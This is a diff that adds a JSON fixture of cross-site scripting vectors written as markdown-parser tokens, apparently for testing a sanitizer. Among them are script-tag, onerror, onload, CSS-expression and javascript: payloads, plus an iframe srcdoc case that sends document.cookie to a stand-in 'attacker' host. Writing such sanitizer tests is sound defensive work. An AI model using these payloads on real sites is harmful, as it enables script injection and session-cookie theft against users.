@@ -1,0 +1,53 @@
+[
+  {
+    "id": "html_script_tag",
+    "desc": "classic script tag",
+    "tokens": [
+      {"type":"html_block","content":"<script>console.log('xss')</script>"}
+    ]
+  },
+  {
+    "id": "html_img_onerror",
+    "desc": "img onerror vector",
+    "tokens": [
+      {"type":"html_block","content":"<img src='x' onerror='alert(1)'>"}
+    ]
+  },
+  {
+    "id": "html_svg_onload",
+    "desc": "svg onload attribute",
+    "tokens": [
+      {"type":"html_block","content":"<svg onload=\"(function(){/*bad*/})();\"></svg>"}
+    ]
+  },
+  {
+    "id": "html_iframe_srcdoc",
+    "desc": "iframe with srcdoc containing a script",
+    "tokens": [
+      {"type":"html_block","content":"<iframe srcdoc='<script>fetch(\"https://attacker/?c=\"+document.cookie)</script>'></iframe>"}
+    ]
+  },
+  {
+    "id": "html_data_uri_svg",
+    "desc": "data: SVG that contains onload",
+    "tokens": [
+      {"type":"html_block","content":"<img src=\"data:image/svg+xml;utf8,<svg onload=alert(1)></svg>\">"}
+    ]
+  },
+  {
+    "id": "html_css_expression",
+    "desc": "CSS expression that may be evaluated in old browsers",
+    "tokens": [
+      {"type":"html_block","content":"<div style=\"width: expression(alert(1))\">X</div>"}
+    ]
+  },
+  {
+    "id": "html_mixed_case_js",
+    "desc": "mixed-case javascript: scheme inside href",
+    "tokens": [
+      {"type":"link_open","tag":"a","nesting":1,"href":"JaVaScRiPt:alert(1)"},
+      {"type":"text","content":"evil"},
+      {"type":"link_close","nesting":-1}
+    ]
+  }
+]
